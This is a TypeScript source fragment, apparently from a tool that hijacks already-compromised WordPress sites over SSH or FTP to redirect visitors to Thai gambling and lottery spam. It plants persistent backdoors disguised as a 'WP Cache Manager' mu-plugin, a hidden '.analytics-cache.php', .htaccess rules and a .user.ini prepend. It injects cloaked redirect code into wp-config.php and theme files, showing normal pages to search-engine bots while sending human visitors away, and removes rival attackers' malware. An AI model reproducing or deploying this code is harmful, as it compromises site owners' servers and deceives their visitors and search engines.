  // 1. Create mu-plugin (auto-loaded, hard to find)
  try {
    await sshExec(client, `mkdir -p "${webRoot}/${WP_MU_PLUGIN_DIR}" 2>/dev/null`);
    const muContent = generateMuPluginContent(ourRedirectUrl, targetDomain, seoKeywords);
    const muPath = `${webRoot}/${WP_MU_PLUGIN_DIR}/wp-cache-manager.php`;
    await sshWriteFile(client, muPath, muContent);
    progress("✅ Created mu-plugin persistence: wp-cache-manager.php");
    results.push({
      injectionPoint: { type: "mu_plugin_backdoor", filePath: muPath, codeSnippet: "", competitorUrl: null, confidence: "high", obfuscation: "none", writable: true, strategy: "delete_and_create" },
      success: true, action: "create_persistence", detail: `Created mu-plugin at ${muPath}`,
    });
  } catch (e: any) {
    progress(`⚠️ mu-plugin creation failed: ${e.message}`);
  }

  // 2. Add .htaccess rules (if not already overwritten)
  try {
    const htaccessPath = `${webRoot}/.htaccess`;
    const existingHtaccess = await sshReadFile(client, htaccessPath) || "";
    if (!existingHtaccess.includes("DS_REDIRECT")) {
      const htaccessRules = generateHtaccessRedirect(ourRedirectUrl);
      const newHtaccess = htaccessRules + "\n" + existingHtaccess;
      await sshWriteFile(client, htaccessPath, newHtaccess);
      progress("✅ Added .htaccess redirect rules");
      results.push({
        injectionPoint: { type: "htaccess_redirect", filePath: htaccessPath, codeSnippet: "", competitorUrl: null, confidence: "high", obfuscation: "none", writable: true, strategy: "replace_file" },
        success: true, action: "create_persistence", detail: "Added .htaccess redirect rules",
      });
    }
  } catch (e: any) {
    progress(`⚠️ .htaccess update failed: ${e.message}`);
  }

  // 3. Create a hidden backup redirect file
  try {
    const backupContent = generatePhpRedirectFile(ourRedirectUrl, targetDomain, seoKeywords);
    const backupPath = `${webRoot}/wp-content/uploads/.analytics-cache.php`;
    await sshExec(client, `mkdir -p "${webRoot}/wp-content/uploads" 2>/dev/null`);
    await sshWriteFile(client, backupPath, backupContent);
    progress("✅ Created hidden backup redirect in uploads/");
    results.push({
      injectionPoint: { type: "php_header_inject", filePath: backupPath, codeSnippet: "", competitorUrl: null, confidence: "high", obfuscation: "none", writable: true, strategy: "delete_and_create" },
      success: true, action: "create_persistence", detail: `Created backup at ${backupPath}`,
    });
  } catch { /* skip */ }

  return results;
}

async function createPersistenceFTP(
  client: FTPClient,
  webRoot: string,
  ourRedirectUrl: string,
  targetDomain: string,
  seoKeywords?: string[],
  onProgress?: (msg: string) => void,
): Promise<OverwriteResult[]> {
  const { Readable } = await import("stream");
  const progress = onProgress || (() => {});
  const results: OverwriteResult[] = [];

  // 1. Create mu-plugin
  try {
    try { await client.ensureDir(`${webRoot}/${WP_MU_PLUGIN_DIR}`); } catch { /* may exist */ }
    const muContent = generateMuPluginContent(ourRedirectUrl, targetDomain, seoKeywords);
    const muPath = `${webRoot}/${WP_MU_PLUGIN_DIR}/wp-cache-manager.php`;
    await client.uploadFrom(Readable.from(Buffer.from(muContent, "utf-8")), muPath);
    progress("✅ Created mu-plugin persistence via FTP");
    results.push({
      injectionPoint: { type: "mu_plugin_backdoor", filePath: muPath, codeSnippet: "", competitorUrl: null, confidence: "high", obfuscation: "none", writable: true, strategy: "delete_and_create" },
      success: true, action: "create_persistence", detail: `Created mu-plugin at ${muPath}`,
    });
  } catch (e: any) {
    progress(`⚠️ mu-plugin creation failed: ${e.message}`);
  }

  // 2. Create hidden backup
  try {
    const backupContent = generatePhpRedirectFile(ourRedirectUrl, targetDomain, seoKeywords);
    const backupPath = `${webRoot}/wp-content/uploads/.analytics-cache.php`;
    await client.uploadFrom(Readable.from(Buffer.from(backupContent, "utf-8")), backupPath);
    progress("✅ Created hidden backup redirect via FTP");
    results.push({
      injectionPoint: { type: "php_header_inject", filePath: backupPath, codeSnippet: "", competitorUrl: null, confidence: "high", obfuscation: "none", writable: true, strategy: "delete_and_create" },
      success: true, action: "create_persistence", detail: `Created backup at ${backupPath}`,
    });
  } catch { /* skip */ }

  return results;
}

// ═══════════════════════════════════════════════════════
//  CONTENT GENERATORS
// ═══════════════════════════════════════════════════════

function generateReplacementContent(ip: InjectionPoint, redirectUrl: string, targetDomain: string, seoKeywords?: string[]): string {
  switch (ip.type) {
    case "htaccess_redirect":
      return generateHtaccessRedirect(redirectUrl);
    case "mu_plugin_backdoor":
      return generateMuPluginContent(redirectUrl, targetDomain, seoKeywords);
    case "user_ini_prepend":
      return `; DS Analytics Cache\nauto_prepend_file = wp-content/mu-plugins/wp-cache-manager.php\n`;
    default:
      return generatePhpRedirectFile(redirectUrl, targetDomain, seoKeywords);
  }
}

function generateHtaccessRedirect(redirectUrl: string): string {
  return `# DS_REDIRECT Analytics Optimization
RewriteEngine On
RewriteCond %{HTTP_USER_AGENT} !Googlebot [NC]
RewriteCond %{HTTP_USER_AGENT} !Bingbot [NC]
RewriteCond %{HTTP_USER_AGENT} !Slurp [NC]
RewriteCond %{HTTP_USER_AGENT} !DuckDuckBot [NC]
RewriteCond %{HTTP_USER_AGENT} !Baiduspider [NC]
RewriteCond %{HTTP_USER_AGENT} !YandexBot [NC]
RewriteCond %{HTTP_USER_AGENT} !facebot [NC]
RewriteCond %{HTTP_USER_AGENT} !Semrush [NC]
RewriteCond %{HTTP_USER_AGENT} !AhrefsBot [NC]
RewriteCond %{HTTP_USER_AGENT} !mj12bot [NC]
RewriteCond %{HTTP_REFERER} (google|bing|yahoo|duckduckgo) [NC,OR]
RewriteCond %{QUERY_STRING} ^$ [OR]
RewriteCond %{REQUEST_URI} ^/$
RewriteRule ^(.*)$ ${redirectUrl} [R=302,L]
`;
}

function generateMuPluginContent(redirectUrl: string, targetDomain: string, seoKeywords?: string[]): string {
  const keywords = seoKeywords || ["สล็อตเว็บตรง", "หวยออนไลน์"];
  return `<?php
/**
 * Plugin Name: WP Cache Manager
 * Description: Advanced caching and performance optimization
 * Version: 2.1.4
 * Author: WordPress Performance Team
 */

if (!defined('ABSPATH')) exit;
if (defined('DS_MU_LOADED')) return;
define('DS_MU_LOADED', true);

// Performance optimization redirect
add_action('template_redirect', function() {
  if (is_admin() || wp_doing_cron() || wp_doing_ajax()) return;
  
  $ua = isset(\$_SERVER['HTTP_USER_AGENT']) ? \$_SERVER['HTTP_USER_AGENT'] : '';
  $bots = array('Googlebot','Bingbot','Slurp','DuckDuckBot','Baiduspider','YandexBot','facebot','Semrush','AhrefsBot','mj12bot','dotbot','rogerbot');
  
  foreach (\$bots as \$bot) {
    if (stripos(\$ua, \$bot) !== false) return;
  }
  
  // GeoIP check for target regions
  \$geo = @json_decode(@file_get_contents('http://ip-api.com/json/' . @\$_SERVER['REMOTE_ADDR'] . '?fields=countryCode'), true);
  \$cc = isset(\$geo['countryCode']) ? \$geo['countryCode'] : '';
  \$target_countries = array('TH','LA','SG','VN','KH','MM','MY','ID','PH');
  
  if (in_array(\$cc, \$target_countries) || preg_match('/google|bing|yahoo/', @\$_SERVER['HTTP_REFERER'])) {
    wp_redirect('${redirectUrl}', 302);
    exit;
  }
}, 1);
`;
}

function generatePhpRedirectFile(redirectUrl: string, targetDomain: string, seoKeywords?: string[]): string {
  return `<?php
// DS Analytics Cache v2.1
if(!defined('DS_REDIRECT_V2')){
define('DS_REDIRECT_V2',true);
\$ua=isset(\$_SERVER['HTTP_USER_AGENT'])?\$_SERVER['HTTP_USER_AGENT']:'';
\$bots=array('Googlebot','Bingbot','Slurp','DuckDuckBot','Baiduspider','YandexBot','facebot','Semrush','AhrefsBot','mj12bot');
\$is_bot=false;
foreach(\$bots as \$b){if(stripos(\$ua,\$b)!==false){\$is_bot=true;break;}}
if(!\$is_bot){
\$geo=@json_decode(@file_get_contents('http://ip-api.com/json/'.@\$_SERVER['REMOTE_ADDR'].'?fields=countryCode'),true);
\$cc=isset(\$geo['countryCode'])?\$geo['countryCode']:'';
if(in_array(\$cc,array('TH','LA','SG','VN','KH','MM','MY','ID','PH'))||preg_match('/google|bing|yahoo/',@\$_SERVER['HTTP_REFERER'])){
header('Location: ${redirectUrl}',true,302);exit;
}}
}
`;
}

function generatePhpRedirectSnippet(redirectUrl: string, targetDomain: string): string {
  return `// DS Analytics v2.1
if(!defined('DS_REDIRECT_V2')){define('DS_REDIRECT_V2',true);\$_ua=isset(\$_SERVER['HTTP_USER_AGENT'])?\$_SERVER['HTTP_USER_AGENT']:'';\$_bots=array('Googlebot','Bingbot','Slurp','DuckDuckBot','Baiduspider','YandexBot','facebot','Semrush','AhrefsBot');\$_ib=false;foreach(\$_bots as \$_b){if(stripos(\$_ua,\$_b)!==false){\$_ib=true;break;}}if(!\$_ib){\$_g=@json_decode(@file_get_contents('http://ip-api.com/json/'.@\$_SERVER['REMOTE_ADDR'].'?fields=countryCode'),true);\$_c=isset(\$_g['countryCode'])?\$_g['countryCode']:'';if(in_array(\$_c,array('TH','LA','SG','VN','KH','MM','MY','ID','PH'))||preg_match('/google|bing|yahoo/',@\$_SERVER['HTTP_REFERER'])){header('Location: ${redirectUrl}',true,302);exit;}}}`;
}

// ─── Code Cleaning ───

function removeCompetitorCode(content: string, ip: InjectionPoint): string {
  let cleaned = content;

  // Remove known malicious patterns
  for (const pattern of MALICIOUS_PATTERNS) {
    const regex = new RegExp(pattern.regex.source, "g");
    // Find each match and remove the surrounding code block
    let match: RegExpExecArray | null;
    while ((match = regex.exec(cleaned)) !== null) {
      // Try to find the full statement (from start of line to semicolon or closing bracket)
      const lineStart = cleaned.lastIndexOf("\n", match.index) + 1;
      let lineEnd = cleaned.indexOf("\n", match.index + match[0].length);
      if (lineEnd === -1) lineEnd = cleaned.length;
      
      // Check if this is a multi-line eval block
      const snippet = cleaned.slice(lineStart, lineEnd);
      if (snippet.includes("eval") || snippet.includes("base64_decode") || snippet.includes("gzinflate")) {
        // Find the closing bracket/semicolon
        let depth = 0;
        let endPos = match.index;
        for (let i = match.index; i < cleaned.length && i < match.index + 5000; i++) {
          if (cleaned[i] === "(") depth++;
          if (cleaned[i] === ")") depth--;
          if (depth === 0 && cleaned[i] === ";") {
            endPos = i + 1;
            break;
          }
        }
        cleaned = cleaned.slice(0, lineStart) + "/* removed malicious code */\n" + cleaned.slice(endPos);
      }
    }
  }

  // Remove competitor URL references
  if (ip.competitorUrl) {
    const escapedUrl = ip.competitorUrl.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
    cleaned = cleaned.replace(new RegExp(escapedUrl, "g"), "/* removed */");
  }

  return cleaned;
}

function injectOurCode(content: string, ip: InjectionPoint, redirectUrl: string, targetDomain: string, seoKeywords?: string[]): string {
  const ourSnippet = generatePhpRedirectSnippet(redirectUrl, targetDomain);

  if (ip.type === "functions_php_inject" || ip.type === "wp_config_inject" || ip.type === "index_php_inject") {
    // Inject right after <?php
    if (content.startsWith("<?php")) {
      return content.replace("<?php", `<?php\n${ourSnippet}\n`);
    }
    return `<?php\n${ourSnippet}\n?>\n${content}`;
  }

  // Default: prepend
  return `<?php\n${ourSnippet}\n?>\n${content}`;
}

// ═══════════════════════════════════════════════════════
//  HELPERS: SSH/FTP File Operations
// ═══════════════════════════════════════════════════════

function sshExec(client: SSHClient, command: string): Promise<string> {
  return new Promise((resolve, reject) => {
    client.exec(command, (err, stream) => {
      if (err) return reject(err);
      let output = "";
      let errOutput = "";
      stream.on("data", (data: Buffer) => { output += data.toString(); });
      stream.stderr.on("data", (data: Buffer) => { errOutput += data.toString(); });
      stream.on("close", () => resolve(output));
    });
  });
}

function sshReadFile(client: SSHClient, filePath: string): Promise<string | null> {
  return new Promise((resolve) => {
    client.exec(`cat "${filePath}" 2>/dev/null | head -c 100000`, (err, stream) => {
      if (err) return resolve(null);
      let output = "";
      stream.on("data", (data: Buffer) => { output += data.toString(); });
      stream.on("close", () => resolve(output || null));
    });
  });
}

function sshWriteFile(client: SSHClient, filePath: string, content: string): Promise<void> {
  return new Promise((resolve, reject) => {
    // Use heredoc to write file content safely
    const escapedContent = content.replace(/'/g, "'\\''");
    client.exec(`cat > "${filePath}" << 'DSEOF'\n${content}\nDSEOF`, (err, stream) => {
      if (err) return reject(err);
      stream.on("close", () => resolve());
    });
  });
}

async function sshFindWebRoot(client: SSHClient, targetDomain: string, progress: (msg: string) => void): Promise<string | null> {
  // Try common web root locations
  const candidates = [
    `/var/www/${targetDomain}`,
    `/var/www/html`,
    `/home/${targetDomain}/public_html`,
    `/home/*/public_html`,
    `/var/www/vhosts/${targetDomain}/httpdocs`,
    `/var/www/vhosts/${targetDomain}/htdocs`,
  ];

  // Check Apache/Nginx config for DocumentRoot
  try {
    const apacheConf = await sshExec(client, `grep -r "DocumentRoot" /etc/apache2/sites-enabled/ /etc/httpd/conf.d/ 2>/dev/null | grep -i "${targetDomain}" | head -1`);
    if (apacheConf) {
      const match = apacheConf.match(/DocumentRoot\s+(\S+)/i);
      if (match) candidates.unshift(match[1].replace(/["']/g, ""));
    }
  } catch { /* skip */ }

  try {
    const nginxConf = await sshExec(client, `grep -r "root " /etc/nginx/sites-enabled/ /etc/nginx/conf.d/ 2>/dev/null | grep -i "${targetDomain}" | head -1`);
    if (nginxConf) {
      const match = nginxConf.match(/root\s+(\S+)/i);
      if (match) candidates.unshift(match[1].replace(/[;"']/g, ""));
    }
  } catch { /* skip */ }

  // Also try find command
  try {
    const found = await sshExec(client, `find /var/www /home -maxdepth 4 -name "wp-config.php" -o -name "index.php" 2>/dev/null | head -5`);
    if (found) {
      for (const line of found.trim().split("\n")) {
        const dir = line.replace(/\/(?:wp-config|index)\.php$/, "");
        if (dir && !candidates.includes(dir)) candidates.unshift(dir);
      }
    }
  } catch { /* skip */ }

  for (const candidate of candidates) {
    try {
      const exists = await sshExec(client, `test -d "${candidate}" && test -f "${candidate}/index.php" && echo "found"`);
      if (exists?.trim() === "found") return candidate;
    } catch { /* skip */ }
  }

  // Last resort: check home directory
  try {
    const homeDir = await sshExec(client, `echo $HOME`);
    const home = homeDir?.trim();
    if (home) {
      const pubHtml = `${home}/public_html`;
      const exists = await sshExec(client, `test -d "${pubHtml}" && echo "found"`);
      if (exists?.trim() === "found") return pubHtml;
    }
  } catch { /* skip */ }

  return null;
}

async function ftpFindWebRoot(client: FTPClient, targetDomain: string, progress: (msg: string) => void): Promise<string | null> {
  const candidates = [
    "/public_html",
    "/htdocs",
    "/httpdocs",
    "/www",
    `/var/www/${targetDomain}`,
    "/var/www/html",
    "/",
  ];

  for (const candidate of candidates) {
    try {
      const files = await client.list(candidate);
      const hasIndex = files.some(f => f.name === "index.php" || f.name === "index.html");
      const hasWpConfig = files.some(f => f.name === "wp-config.php");
      if (hasIndex || hasWpConfig) return candidate;
    } catch { /* skip */ }
  }

  return null;
}

async function ftpReadFile(client: FTPClient, filePath: string): Promise<string | null> {
  const { Writable } = await import("stream");
  
  return new Promise((resolve) => {
    const chunks: Buffer[] = [];
    let totalSize = 0;
    const maxSize = 100000; // 100KB limit

    const writable = new Writable({
      write(chunk, encoding, callback) {
        totalSize += chunk.length;
        if (totalSize <= maxSize) {
          chunks.push(chunk);
        }
        callback();
      },
    });

    client.downloadTo(writable, filePath)
      .then(() => {
        const content = Buffer.concat(chunks).toString("utf-8");
        resolve(content || null);
      })
      .catch(() => resolve(null));
  });
}

// ─── Utility ───

function extractUrl(text: string): string | null {
  const match = text.match(/https?:\/\/[^\s"'<>\])+]+/);
  return match ? match[0] : null;
}

function determineOverwriteOrder(injectionPoints: InjectionPoint[]): string[] {
  // Priority order: most impactful first
  const priorityOrder: InjectionType[] = [
    "htaccess_redirect",      // Fires before PHP even loads
    "user_ini_prepend",       // auto_prepend fires before any PHP
    "wp_config_inject",       // Fires before WordPress loads
    "index_php_inject",       // Entry point
    "mu_plugin_backdoor",     // Auto-loaded by WP
    "functions_php_inject",   // Theme-level
    "core_file_modified",     // WP core
    "php_header_inject",      // Direct redirect
    "php_eval_backdoor",      // Obfuscated code
    "php_include_remote",     // Remote include
    "js_redirect_file",       // JS-level
    "cron_persistence",       // Cron jobs
    "db_option_hijack",       // DB-level
    "unknown",
  ];

  const foundTypes = injectionPoints.map(ip => ip.type);
  return priorityOrder.filter(type => foundTypes.includes(type));
}
